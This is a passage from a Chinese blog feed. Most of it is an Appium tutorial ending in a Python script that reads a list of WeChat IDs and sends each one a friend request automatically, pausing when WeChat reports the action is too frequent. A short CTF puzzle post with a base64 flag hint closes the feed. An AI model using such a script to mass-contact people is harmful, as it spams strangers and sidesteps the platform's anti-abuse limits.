<p>通过UIAutomator的选择器来获取元素。因为Appium在Android上实际是调用的UIAutomator，所以可以通过UIAutomator的选择器来选择元素。</p>
<pre class="lang:python decode:true ">el = dr.find_element_by_android_ui_automator("new UiSelector().text(\"搜索\")")
el.click()</pre>
<h3>操作函数</h3>
<p>操作函数用于操作选定的元素，有很多，以下仅列举几个，更多的请查阅手册。</p>
<ol>
<li>click</li>
<li>send_keys</li>
<li>clear</li>
</ol>
<p>查询函数返回的元素对象可以像JS中的dom元素一样，继续使用查询函数来选定其子元素。用例如下。</p>
<pre class="lang:python decode:true">search = dr.find_element_by_id("com.tencent.mm:id/aqw").find_element_by_class_name("android.widget.RelativeLayout")
search.click()</pre>
<h2>如何确定查询规则</h2>
<p>了解了相关的函数后，下面就应对UI进行定位了。如果是自己团队开发的程序，推荐让开发同学在所有的空间上都添加resource_id进行绝对定位。如果碰到没有谈价resource_id的元素，那就要使用别的办法进行定位了。</p>
<h3>1. UI Automator Viewer</h3>
<p>UI Automator Viewer是Android官方的UI定位工具，位于sdk/tools下。运行后会打开viewer界面。点击获取按钮即可获取当前正在运行的Activity的UI结构。</p>
<p><a href="https://www.summershrimp.com/wp-content/uploads/2016/08/uiviewer.png"><img class="alignnone size-medium wp-image-104" src="https://www.summershrimp.com/wp-content/uploads/2016/08/uiviewer-300x225.png" alt="uiviewer" width="300" height="225" srcset="https://www.summershrimp.com/wp-content/uploads/2016/08/uiviewer-300x225.png 300w, https://www.summershrimp.com/wp-content/uploads/2016/08/uiviewer-768x576.png 768w, https://www.summershrimp.com/wp-content/uploads/2016/08/uiviewer-1024x768.png 1024w, https://www.summershrimp.com/wp-content/uploads/2016/08/uiviewer.png 1600w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
<h3>2. AppiumDriver getPageSource</h3>
<p>AppiumDriver(Client) 可以很方便的获得当前正在运行的Activity的UI描述，随后可根据返回的XML文档来寻找元素。</p>
<pre class="lang:python decode:true">print dr.page_source</pre>
<p><a href="https://www.summershrimp.com/wp-content/uploads/2016/08/2014100408573062.jpg"><img class="alignnone size-medium wp-image-108" src="https://www.summershrimp.com/wp-content/uploads/2016/08/2014100408573062-300x178.jpg" alt="getSource" width="300" height="178" srcset="https://www.summershrimp.com/wp-content/uploads/2016/08/2014100408573062-300x178.jpg 300w, https://www.summershrimp.com/wp-content/uploads/2016/08/2014100408573062-768x456.jpg 768w, https://www.summershrimp.com/wp-content/uploads/2016/08/2014100408573062-1024x608.jpg 1024w, https://www.summershrimp.com/wp-content/uploads/2016/08/2014100408573062.jpg 1261w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
<p>(图片与他人，侵删)</p>
<p>确定元素位置后，即可根据前述的Find方法来查找/选择元素</p>
<h2>编写完整的测试代码</h2>
<p>正确的获取元素之后便可以获取元素相关的信息，随后使用各语言常用的测试框架编写测试即可，如Java的JUnit，Nodejs的Mocha等。</p>
<p>这里我使用Appium主要是为了模拟用户点击添加微信好友，所以完整的程序并没有使用到测试框架。相关的UI元素获取/操作方法供大家参考。</p>
<pre class="lang:python decode:true "># coding:utf-8
from appium import webdriver
from time import sleep


def addFriend(dr, id, dryRun=False):
    succ = False
    wechatId = str(id)
    dr.find_element_by_accessibility_id(r"更多功能按钮").click()
    item_list = dr.find_elements_by_class_name("android.widget.LinearLayout")
    try:
        item_list[2].click()
    except:
        print "Error! in item list len"
        return succ
    el = dr.find_element_by_class_name("android.widget.ListView")
    item_list = el.find_elements_by_class_name("android.widget.LinearLayout")
    try:
        item_list[1].click()
    except:
        print "Error! in item list len"
        return succ
    t = dr.find_element_by_id("com.tencent.mm:id/f7")
    t.send_keys(wechatId)
    search = dr.find_element_by_id("com.tencent.mm:id/aqw").find_element_by_class_name("android.widget.RelativeLayout")
    search.click()
    try:
        freq = dr.find_element_by_id('com.tencent.mm:id/aqq')
        assert freq.text == u"操作过于频繁，请稍后再试。"
        print "Frequency too high! Sleep 300s"
        sleep(60)
        return succ
    except:
        pass

    try:
        dr.find_element_by_id('com.tencent.mm:id/a8x').click()
        addBtn = dr.find_element_by_id('com.tencent.mm:id/eu')
        if not dryRun:
            addBtn.click()
            succ = True
        print "Success Send Requests:" + wechatId
    except:
        print "No Such User Or Already a Friend:" + wechatId

    while True:
        try:
            dr.find_element_by_id('com.tencent.mm:id/fb').click()
        except:
            try:
                dr.find_element_by_id('com.tencent.mm:id/f4').click()
            except:
                break
    return True

def resetActivity(dr, desired_caps):
    dr.start_activity(desired_caps['appPackage'], desired_caps['appActivity'])

desired_caps = {}
desired_caps['platformName'] = 'Android'
desired_caps['platformVersion'] = '5.1'
desired_caps['deviceName'] = 'm3_note'
desired_caps['appPackage'] = 'com.tencent.mm'
desired_caps['appActivity'] = '.ui.LauncherUI'
print "Trying connect to phone..."
dr = {}
try:
    dr = webdriver.Remote('http://localhost:4723/wd/hub', desired_caps)
except Exception, e:
    print "Cannot Connect to phone :", e
    exit()
print "Successfully connect to phone."
print "Reading friend list..."
friendList = []
fp = open("friends.txt")
line = fp.readline().strip()
while line:
    friendList.append(line)
    line = fp.readline().strip()
print "Finish reading friends. Total: " + str(len(friendList))
print "Wait for Wechat's splash screen...."
for i in range(0, 10):
    print 10 - i
    sleep(1)
succ_list = []
fail_list = []
for i in friendList:
    try:
        succ = addFriend(dr, i, dryRun=False)
        if succ:
            succ_list.append(i)
        else:
            fail_list.append(i)
    except:
        fail_list.append(i)
        resetActivity(dr, desired_caps)

print "Succeed List:"
print "\n".join(succ_list)
print "Failed List:"
print "\n".join(fail_list)

dr.close()</pre>
<p>&nbsp;</p>]]></content>
        <author>
            <name><![CDATA[0xe799bde88f9c]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.summershrimp.com/2016/04/nuaactf/</id>
        <title><![CDATA[095a655fc809cbbdffa207717a5233f5的原文是什么？]]></title>
        <updated>2016-04-19T02:47:11+08:00</updated>
        <link href="https://www.summershrimp.com/2016/04/nuaactf/"/>
        <content type="text/html" src="https://www.summershrimp.com/2016/04/nuaactf/"><![CDATA[<p>095a655fc809cbbdffa207717a5233f5的原文是</p>
<pre class="lang:default decode:true ">bnVhYWN0ZiU3Qi93ZWIyL2NlYmE2ZmJiZjBlZGU0MzI1MjY0MWNkMzM2ZTM2YTAzJTdE</pre>
<p>Happy NUAACTF!</p>]]></content>
        <author>
            <name><![CDATA[0xe799bde88f9c]]></name>
        </author>
    </entry>
    
</feed>